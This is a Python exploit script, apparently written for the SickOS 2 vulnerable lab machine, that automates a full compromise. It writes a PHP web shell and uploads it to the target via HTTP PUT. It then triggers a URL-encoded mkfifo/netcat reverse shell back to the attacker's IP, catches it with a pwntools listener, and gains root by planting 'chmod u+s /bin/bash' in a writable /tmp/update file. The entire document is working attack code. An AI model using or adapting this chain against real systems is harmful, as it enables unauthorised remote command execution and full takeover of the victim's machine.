#!/usr/bin/python3
try:
	with open('shell.php', 'w') as f1:
		f1.write('<?php if(isset($_REQUEST[\'cmd\'])){ echo "<pre>".shell_exec($_REQUEST[\'cmd\'])."</pre>" ;}; ?>')
except:
	print("[\033[31m!\033[39m] You should run it as root")
	exit(0)

import requests, threading, time
from os import *

try:
	from pwn import *
except:
	print("[\033[31m!\033[39m] Couldnt locate pwntools")
	print("[\033[33m?\033[39m] For install pwntools, use: pip install pwntools")
	exit(0)

if len(sys.argv) != 3:
	print("[\033[31m!\033[39m] Correct usage: sudo ./sickos2.py <target ip> <local ip>")
	exit(1)

os.system(f'curl -s -X PUT -H "Expect: " {sys.argv[1]}/test/shell.php -d@./shell.php > /dev/null')
os.system("rm -r ./shell.php")
def cmd():
	os.system(f"curl http://{sys.argv[1]}/test/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20{sys.argv[2]}%20443%20%3E%2Ftmp%2Ff")

threading.Thread(target=cmd).start()
shell = listen(443, timeout=20).wait_for_connection()
shell.sendline(b"script /dev/null -c sh")
time.sleep(1)
shell.sendline(b"export TERM=xterm; export SHELL=bash")
shell.sendline(b"echo 'chmod u+s /bin/bash' > /tmp/update")
shell.sendline(b"chmod 777 /tmp/update")
time.sleep(45)
shell.sendline(b"bash -p")
shell.sendline(b"clear; echo -n '$ Logged in as: '; whoami")
shell.interactive()
